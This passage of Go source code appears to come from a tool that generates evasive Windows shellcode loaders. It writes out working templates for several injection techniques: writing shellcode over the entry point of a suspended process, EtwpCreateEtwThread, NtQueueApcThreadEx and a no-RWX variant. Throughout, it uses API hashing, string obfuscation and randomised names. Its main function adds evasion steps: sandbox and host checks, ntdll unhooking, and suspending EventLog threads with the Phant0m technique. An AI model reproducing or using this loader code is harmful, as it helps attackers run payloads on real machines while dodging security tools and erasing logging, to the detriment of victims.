  {{.Vars.UpdateProcThreadAttribute}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("UpdateProcThreadAttribute", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.CreateProcessA}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("CreateProcessA", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.ReadProcessMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("ReadProcessMemory", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.WriteProcessMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("WriteProcessMemory", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.ResumeThread}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("ResumeThread", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.ZwQueryInformationProcess}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("ZwQueryInformationProcess", rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
`
    } else {
      execute_shellcode_func = execute_shellcode_func + `
  {{.Vars.kernel32}} := windows.NewLazyDLL(` + ObfuscateStr("kernel32.dll", str_obfs) + `)
  {{.Vars.ntdll}} := windows.NewLazyDLL(` + ObfuscateStr("ntdll.dll", str_obfs) + `)

  {{.Vars.GetProcessHeap}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("GetProcessHeap", str_obfs) + `)
  {{.Vars.HeapAlloc}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("HeapAlloc", str_obfs) + `)
  {{.Vars.HeapFree}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("HeapFree", str_obfs) + `)
  {{.Vars.InitializeProcThreadAttributeList}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("InitializeProcThreadAttributeList", str_obfs) + `)
  {{.Vars.UpdateProcThreadAttribute}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("UpdateProcThreadAttribute", str_obfs) + `)
  {{.Vars.CreateProcessA}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("CreateProcessA", str_obfs) + `)
  {{.Vars.ReadProcessMemory}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("ReadProcessMemory", str_obfs) + `)
  {{.Vars.WriteProcessMemory}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("WriteProcessMemory", str_obfs) + `)
  {{.Vars.ResumeThread}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("ResumeThread", str_obfs) + `)
  {{.Vars.ZwQueryInformationProcess}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr("ZwQueryInformationProcess", str_obfs) + `)
`
    }

    execute_shellcode_func = execute_shellcode_func + `
  var {{.Vars.pbi}} PROCESS_BASIC_INFORMATION
  var {{.Vars.si}} StartupInfoEx
  var {{.Vars.pi}} ProcessInformation

  if ({{.Vars.blockdlls}}) {
    {{.Vars.procThreadAttributeSize}} := uintptr(0)
    {{.Vars.InitializeProcThreadAttributeList}}.Call(0, 2, 0, uintptr(unsafe.Pointer(&{{.Vars.procThreadAttributeSize}})))

    {{.Vars.procHeap}}, _, {{.Vars.err}} := {{.Vars.GetProcessHeap}}.Call()
    if {{.Vars.procHeap}} == 0 {
      return {{.Vars.err}}
    }

    {{.Vars.attributeList}}, _, {{.Vars.err}} := {{.Vars.HeapAlloc}}.Call({{.Vars.procHeap}}, 0, {{.Vars.procThreadAttributeSize}})
    if {{.Vars.attributeList}} == 0 {
      return {{.Vars.err}}
    }
    defer {{.Vars.HeapFree}}.Call({{.Vars.procHeap}}, 0, {{.Vars.attributeList}})

    {{.Vars.si}}.AttributeList = (*PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer({{.Vars.attributeList}}))

    {{.Vars.InitializeProcThreadAttributeList}}.Call(uintptr(unsafe.Pointer({{.Vars.si}}.AttributeList)), 2, 0, uintptr(unsafe.Pointer(&{{.Vars.procThreadAttributeSize}})))

    {{.Vars.mitigate}} := 0x20007
    {{.Vars.nonms}} := uintptr(0x100000000000|0x1000000000)

    {{.Vars.r}}, _, {{.Vars.err}} := {{.Vars.UpdateProcThreadAttribute}}.Call(uintptr(unsafe.Pointer({{.Vars.si}}.AttributeList)), 0, uintptr({{.Vars.mitigate}}), uintptr(unsafe.Pointer(&{{.Vars.nonms}})), uintptr(unsafe.Sizeof({{.Vars.nonms}})), 0, 0)
    if {{.Vars.r}} == 0 {
      return {{.Vars.err}}
    }
  }

  {{.Vars.cmd}} := append([]byte(` + ObfuscateStr(process, str_obfs) + `), byte(0))

  {{.Vars.si}}.Cb = uint32(unsafe.Sizeof({{.Vars.si}}))

  {{.Vars.r}}, _, {{.Vars.err}} := {{.Vars.CreateProcessA}}.Call(0, uintptr(unsafe.Pointer(&{{.Vars.cmd}}[0])), 0, 0, 1, windows.EXTENDED_STARTUPINFO_PRESENT|windows.CREATE_SUSPENDED, 0, 0, uintptr(unsafe.Pointer(&{{.Vars.si}})), uintptr(unsafe.Pointer(&{{.Vars.pi}})))
  if {{.Vars.r}} == 0 {
    return {{.Vars.err}}
  }

  var {{.Vars.returnLength}} int32
  {{.Vars.pointerSize}} := unsafe.Sizeof(uintptr(0))

  {{.Vars.ZwQueryInformationProcess}}.Call(uintptr({{.Vars.pi}}.Process), 0, uintptr(unsafe.Pointer(&{{.Vars.pbi}})), {{.Vars.pointerSize}}*6, uintptr(unsafe.Pointer(&{{.Vars.returnLength}})))

  {{.Vars.imageBaseAddress}} := {{.Vars.pbi}}.PebBaseAddress + 0x10
  {{.Vars.addressBuffer}} := make([]byte, {{.Vars.pointerSize}})

  var {{.Vars.read}} uintptr
  {{.Vars.ReadProcessMemory}}.Call(uintptr({{.Vars.pi}}.Process), {{.Vars.imageBaseAddress}}, uintptr(unsafe.Pointer(&{{.Vars.addressBuffer}}[0])), uintptr(len({{.Vars.addressBuffer}})), uintptr(unsafe.Pointer(&{{.Vars.read}})))

	{{.Vars.imageBaseValue}} := binary.LittleEndian.Uint64({{.Vars.addressBuffer}})
	{{.Vars.addressBuffer}} = make([]byte, 0x200)

  {{.Vars.ReadProcessMemory}}.Call(uintptr({{.Vars.pi}}.Process), uintptr({{.Vars.imageBaseValue}}), uintptr(unsafe.Pointer(&{{.Vars.addressBuffer}}[0])), uintptr(len({{.Vars.addressBuffer}})), uintptr(unsafe.Pointer(&{{.Vars.read}})))

	{{.Vars.lfaNewPos}} := {{.Vars.addressBuffer}}[0x3c : 0x3c+0x4]
	{{.Vars.lfanew}} := binary.LittleEndian.Uint32({{.Vars.lfaNewPos}})
	{{.Vars.entrypointOffset}} := {{.Vars.lfanew}} + 0x28
	{{.Vars.entrypointOffsetPos}} := {{.Vars.addressBuffer}}[{{.Vars.entrypointOffset}} : {{.Vars.entrypointOffset}}+0x4]
	{{.Vars.entrypointRVA}} := binary.LittleEndian.Uint32({{.Vars.entrypointOffsetPos}})
	{{.Vars.entrypointAddress}} := {{.Vars.imageBaseValue}} + uint64({{.Vars.entrypointRVA}})

  {{.Vars.WriteProcessMemory}}.Call(uintptr({{.Vars.pi}}.Process), uintptr({{.Vars.entrypointAddress}}), uintptr(unsafe.Pointer(&{{.Vars.shellcode}}[0])), uintptr(len({{.Vars.shellcode}})), 0)

  {{.Vars.ResumeThread}}.Call(uintptr({{.Vars.pi}}.Thread))

  return nil
}`

  } else if exec_technique == "etwpcreateetwthread" { // next shellcode execution technique
    imports = utils.AppendSlice(imports, []string{"unsafe", "golang.org/x/sys/windows"})
    dlls_to_unhook = utils.AppendString(dlls_to_unhook, "C:\\Windows\\System32\\ntdll.dll")

    Main.Vars["execute_shellcode_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["ntdll"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["NtAllocateVirtualMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["NtProtectVirtualMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["RtlCopyMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["EtwpCreateEtwThread"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["NtWaitForSingleObject"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["addr"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["regionsize"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["r1"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["r2"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["r3"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["err"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["oldProtect"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["thread"] = utils.RandomString(utils.RandomInt(9,10))

    execute_shellcode_func = `
func {{.Vars.execute_shellcode_func}}({{.Vars.shellcode}} []byte) error {
`

    if (hashing) {
      execute_shellcode_func = execute_shellcode_func + `
  {{.Vars.NtAllocateVirtualMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash(NtAllocateVirtualMemory, rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.NtProtectVirtualMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash(NtProtectVirtualMemory, rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.NtWaitForSingleObject}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("NtWaitForSingleObject", rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.RtlCopyMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("RtlCopyMemory", rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.EtwpCreateEtwThread}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("EtwpCreateEtwThread", rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
`
    } else {
      execute_shellcode_func = execute_shellcode_func + `
  {{.Vars.ntdll}} := windows.NewLazyDLL(` + ObfuscateStr("ntdll.dll", str_obfs) + `)
  {{.Vars.NtAllocateVirtualMemory}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr(NtAllocateVirtualMemory, str_obfs) + `)
  {{.Vars.NtProtectVirtualMemory}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr(NtProtectVirtualMemory, str_obfs) + `)
	{{.Vars.NtWaitForSingleObject}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr("NtWaitForSingleObject", str_obfs) + `)
	{{.Vars.RtlCopyMemory}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr("RtlCopyMemory", str_obfs) + `)
	{{.Vars.EtwpCreateEtwThread}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr("EtwpCreateEtwThread", str_obfs) + `)
`
    }

    execute_shellcode_func = execute_shellcode_func + `
  var {{.Vars.addr}} uintptr
  {{.Vars.regionsize}} := uintptr(len({{.Vars.shellcode}}))

  {{.Vars.r1}}, _, {{.Vars.err}} := {{.Vars.NtAllocateVirtualMemory}}.Call(^uintptr(0),  uintptr(unsafe.Pointer(&{{.Vars.addr}})), 0, uintptr(unsafe.Pointer(&{{.Vars.regionsize}})), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if {{.Vars.r1}} != 0 {
    return {{.Vars.err}}
	}

	{{.Vars.RtlCopyMemory}}.Call({{.Vars.addr}}, uintptr(unsafe.Pointer(&{{.Vars.shellcode}}[0])), {{.Vars.regionsize}})

	{{.Vars.oldProtect}} := windows.PAGE_READWRITE
  {{.Vars.r2}}, _, {{.Vars.err}} := {{.Vars.NtProtectVirtualMemory}}.Call(^uintptr(0), uintptr(unsafe.Pointer(&{{.Vars.addr}})), uintptr(unsafe.Pointer(&{{.Vars.regionsize}})), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&{{.Vars.oldProtect}})))
  if {{.Vars.r2}} != 0 {
    return {{.Vars.err}}
  }

  {{.Vars.thread}}, _, {{.Vars.err}} := {{.Vars.EtwpCreateEtwThread}}.Call({{.Vars.addr}}, uintptr(0))
  if {{.Vars.thread}} == 0 {
    return {{.Vars.err}}
  }

	{{.Vars.r3}}, _, {{.Vars.err}} := {{.Vars.NtWaitForSingleObject}}.Call({{.Vars.thread}}, uintptr(0), 0xFFFFFFFF)
	if {{.Vars.r3}} != 0 {
    return {{.Vars.err}}
	}

  return nil
}
`

  } else if exec_technique == "ntqueueapcthreadex" || exec_technique == "ntqueueapcthread" { // next shellcode execution technique
    imports = utils.AppendSlice(imports, []string{"unsafe", "golang.org/x/sys/windows"})
    dlls_to_unhook = utils.AppendString(dlls_to_unhook, "C:\\Windows\\System32\\ntdll.dll")

    Main.Vars["execute_shellcode_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["kernel32"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ntdll"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["GetCurrentThread"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["NtAllocateVirtualMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["NtProtectVirtualMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["RtlCopyMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["NtQueueApcThreadEx"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["addr"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["regionsize"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["r1"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["r2"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["err"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["oldProtect"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["thread"] = utils.RandomString(utils.RandomInt(9,10))

    execute_shellcode_func = `
func {{.Vars.execute_shellcode_func}}({{.Vars.shellcode}} []byte) error {
`

    if (hashing) {
      execute_shellcode_func = execute_shellcode_func + `
  {{.Vars.GetCurrentThread}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("GetCurrentThread", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.NtAllocateVirtualMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash(NtAllocateVirtualMemory, rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.NtProtectVirtualMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash(NtProtectVirtualMemory, rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.NtQueueApcThreadEx}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("NtQueueApcThreadEx", rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.RtlCopyMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("RtlCopyMemory", rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
`     
    } else {
      execute_shellcode_func = execute_shellcode_func + `
  {{.Vars.kernel32}} := windows.NewLazyDLL(` + ObfuscateStr("kernel32.dll", str_obfs) + `)
  {{.Vars.ntdll}} := windows.NewLazyDLL(` + ObfuscateStr("ntdll.dll", str_obfs) + `)

  {{.Vars.GetCurrentThread}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("GetCurrentThread", str_obfs) + `)
  {{.Vars.NtAllocateVirtualMemory}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr(NtAllocateVirtualMemory, str_obfs) + `)
  {{.Vars.NtProtectVirtualMemory}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr(NtProtectVirtualMemory, str_obfs) + `)
  {{.Vars.RtlCopyMemory}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr("RtlCopyMemory", str_obfs) + `)
  {{.Vars.NtQueueApcThreadEx}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr("NtQueueApcThreadEx", str_obfs) + `)
`
    }

    execute_shellcode_func = execute_shellcode_func + `
  const (
    QUEUE_USER_APC_FLAGS_NONE = iota
    QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
    QUEUE_USER_APC_FLGAS_MAX_VALUE
  )

  var {{.Vars.addr}} uintptr
  {{.Vars.regionsize}} := uintptr(len({{.Vars.shellcode}}))

  {{.Vars.r1}}, _, {{.Vars.err}} := {{.Vars.NtAllocateVirtualMemory}}.Call(^uintptr(0), uintptr(unsafe.Pointer(&{{.Vars.addr}})), 0, uintptr(unsafe.Pointer(&{{.Vars.regionsize}})), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
  if {{.Vars.r1}} != 0 {
    return {{.Vars.err}}
  }

  {{.Vars.RtlCopyMemory}}.Call({{.Vars.addr}}, uintptr(unsafe.Pointer(&{{.Vars.shellcode}}[0])), {{.Vars.regionsize}})

	{{.Vars.oldProtect}} := windows.PAGE_READWRITE
  {{.Vars.r2}}, _, {{.Vars.err}} := {{.Vars.NtProtectVirtualMemory}}.Call(^uintptr(0), uintptr(unsafe.Pointer(&{{.Vars.addr}})), uintptr(unsafe.Pointer(&{{.Vars.regionsize}})), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&{{.Vars.oldProtect}})))
  if {{.Vars.r2}} != 0 {
    return {{.Vars.err}}
  }

  {{.Vars.thread}}, _, _ := {{.Vars.GetCurrentThread}}.Call()

  {{.Vars.NtQueueApcThreadEx}}.Call({{.Vars.thread}}, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, uintptr({{.Vars.addr}}), 0, 0, 0)

  return nil
}
`
  } else if (exec_technique == "no-rwx" || exec_technique == "norwx") {

    image_dos_header_struct := `
type IMAGE_DOS_HEADER struct {
	E_lfanew uint32
}
`

    image_nt_header_struct := `
type IMAGE_NT_HEADER struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER
}
`

    image_file_header_struct := `
type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}
`

    image_optional_header_struct := `
type IMAGE_OPTIONAL_HEADER struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]IMAGE_DATA_DIRECTORY
}
`

    image_data_struct := `
type IMAGE_DATA_DIRECTORY struct {
	VirtualAddress uint32
	Size uint32
}
`

    exports = utils.AppendSlice(exports, []string{image_dos_header_struct, image_nt_header_struct, image_file_header_struct, image_optional_header_struct, image_data_struct})
    imports = utils.AppendSlice(imports, []string{"encoding/binary", "unsafe", "golang.org/x/sys/windows"})
    dlls_to_unhook = utils.AppendString(dlls_to_unhook, "C:\\Windows\\System32\\ntdll.dll")

    Main.Vars["execute_shellcode_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["kernel32"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ntdll"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["CreateProcessW"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["WriteProcessMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ReadProcessMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ResumeThread"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["NtQueryInformationProcess"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["pbi"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["si"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["pi"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["cmd"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["err"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["info"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["returnLength"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["pebOffset"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["imageBase"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["headersBuffer"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["dosHeader"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ntHeader"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["codeEntry"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["r1"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["r2"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["r3"] = utils.RandomString(utils.RandomInt(9,10))

    execute_shellcode_func = `
func {{.Vars.execute_shellcode_func}}({{.Vars.shellcode}} []byte) error {
`

    if (hashing) {
      execute_shellcode_func = execute_shellcode_func + `
  {{.Vars.CreateProcessW}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("CreateProcessW", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.WriteProcessMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("WriteProcessMemory", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.ReadProcessMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("ReadProcessMemory", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.ResumeThread}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("ResumeThread", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.NtQueryInformationProcess}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash(NtQueryInformationProcess, rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
`
    } else {
      execute_shellcode_func = execute_shellcode_func + `
  {{.Vars.kernel32}} := windows.NewLazyDLL(` + ObfuscateStr("kernel32.dll", str_obfs) + `)
	{{.Vars.ntdll}} := windows.NewLazyDLL(` + ObfuscateStr("ntdll.dll", str_obfs) + `)

  {{.Vars.CreateProcessW}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("CreateProcessW", str_obfs) + `)
  {{.Vars.WriteProcessMemory}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("WriteProcessMemory", str_obfs) + `)
  {{.Vars.ReadProcessMemory}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("ReadProcessMemory", str_obfs) + `)
	{{.Vars.ResumeThread}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("ResumeThread", str_obfs) + `)
	{{.Vars.NtQueryInformationProcess}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr(NtQueryInformationProcess, str_obfs) + `)
`
    }

    execute_shellcode_func = execute_shellcode_func + `
  var {{.Vars.pbi}} windows.PROCESS_BASIC_INFORMATION
  {{.Vars.si}} := &windows.StartupInfo{}
	{{.Vars.pi}} := &windows.ProcessInformation{}

  {{.Vars.cmd}}, {{.Vars.err}} := windows.UTF16PtrFromString(` + ObfuscateStr(process, str_obfs) + `)
  if {{.Vars.err}} != nil {
    return {{.Vars.err}}
  }

  {{.Vars.CreateProcessW}}.Call(0, uintptr(unsafe.Pointer({{.Vars.cmd}})), 0, 0, uintptr(0), windows.CREATE_SUSPENDED, 0, 0, uintptr(unsafe.Pointer({{.Vars.si}})), uintptr(unsafe.Pointer({{.Vars.pi}})))

	var {{.Vars.info}} int32
	var {{.Vars.returnLength}} int32

	{{.Vars.NtQueryInformationProcess}}.Call(uintptr({{.Vars.pi}}.Process), uintptr({{.Vars.info}}), uintptr(unsafe.Pointer(&{{.Vars.pbi}})), uintptr(unsafe.Sizeof(windows.PROCESS_BASIC_INFORMATION{})), uintptr(unsafe.Pointer(&{{.Vars.returnLength}})))

	{{.Vars.pebOffset}} := uintptr(unsafe.Pointer({{.Vars.pbi}}.PebBaseAddress)) + 0x10
	var {{.Vars.imageBase}} uintptr = 0

  {{.Vars.r1}}, _, {{.Vars.err}} := {{.Vars.ReadProcessMemory}}.Call(uintptr({{.Vars.pi}}.Process), {{.Vars.pebOffset}}, uintptr(unsafe.Pointer(&{{.Vars.imageBase}})), 8, 0)
  if {{.Vars.r1}} == 0 {
    return {{.Vars.err}}
  }

	{{.Vars.headersBuffer}} := make([]byte, 4096)

  {{.Vars.r2}}, _, {{.Vars.err}} := {{.Vars.ReadProcessMemory}}.Call(uintptr({{.Vars.pi}}.Process), uintptr({{.Vars.imageBase}}), uintptr(unsafe.Pointer(&{{.Vars.headersBuffer}}[0])), 4096, 0)
  if {{.Vars.r2}} == 0 {
    return {{.Vars.err}}
  }

	var {{.Vars.dosHeader}} IMAGE_DOS_HEADER
	{{.Vars.dosHeader}}.E_lfanew = binary.LittleEndian.Uint32({{.Vars.headersBuffer}}[60:64])
	{{.Vars.ntHeader}} := (*IMAGE_NT_HEADER)(unsafe.Pointer(uintptr(unsafe.Pointer(&{{.Vars.headersBuffer}}[0])) + uintptr({{.Vars.dosHeader}}.E_lfanew)))
	{{.Vars.codeEntry}} := uintptr({{.Vars.ntHeader}}.OptionalHeader.AddressOfEntryPoint) + {{.Vars.imageBase}}

	{{.Vars.r3}}, _, {{.Vars.err}} := {{.Vars.WriteProcessMemory}}.Call(uintptr({{.Vars.pi}}.Process), {{.Vars.codeEntry}}, uintptr(unsafe.Pointer(&{{.Vars.shellcode}}[0])), uintptr(len({{.Vars.shellcode}})), 0)
  if {{.Vars.r3}} == 0 {
    return {{.Vars.err}}
  }

	{{.Vars.ResumeThread}}.Call(uintptr({{.Vars.pi}}.Thread))

  return nil
}
`
  }

  //
  // shellcode execution techniques end here
  // now the loader will be built by putting all the functions together
  //

  // append shellcode execution function
  functions = utils.AppendString(functions, ParseTemplate(execute_shellcode_func, Main))

  var main_func string

  imports = utils.AppendString(imports, "log")

  // check if loader must be a DLL to compile the code like so
  if (format == "exe") {
    // define main function
    main_func = `
func main(){
  var {{.Vars.err}} error
`
  } else if (format == "dll") {
    imports = utils.AppendString(imports, "C")

    // define main function
    main_func = `
func main(){}

//export ` + func_name + `
func ` + func_name + `(){

  var {{.Vars.err}} error
`
  }

  // add sleep at first
  if (sleep_time) {
    main_func = main_func + `
  {{.Vars.sleep_func}}()
`
  }

  if (username != "") {
    main_func = main_func + `
  {{.Vars.username}}, {{.Vars.err}} := user.Current()
  if {{.Vars.err}} != nil {
    return
  }

  if ({{.Vars.username}}.Username != ` + ObfuscateStr(username, str_obfs) + `) {
    return
  }
`
  }

  if (computername != "") {
    main_func = main_func + `
  {{.Vars.computername}}, {{.Vars.err}} := os.Hostname()
  if {{.Vars.err}} != nil {
    return
  }

  if ({{.Vars.computername}} != ` + ObfuscateStr(computername, str_obfs) + `) {
    return
  }
`
  }

  // add sandboxing functions
  if (sandbox) {
    main_func = main_func + `
  if {{.Vars.sandbox_func}}() {
    return
  }
`
  }

  if (unhook != "") {
    main_func = main_func + `
  {{.Vars.err}} = {{.Vars.unhook_func}}(` + ConvertSliceToStrFormat(dlls_to_unhook, str_obfs) + `)
  if {{.Vars.err}} != nil {
    log.Fatal({{.Vars.err}})
  }
`
  }
  
  // use Phant0m technique to suspend EventLog threads
  if (phantom) {
    main_func = main_func + `
    {{.Vars.eventlog_pid}}, {{.Vars.err}} := {{.Vars.get_eventlog_pid_func}}()
    if {{.Vars.err}} != nil {
      log.Fatal({{.Vars.err}})
    }

    {{.Vars.err}} = {{.Vars.phantom_func}}({{.Vars.eventlog_pid}})
    if {{.Vars.err}} != nil {
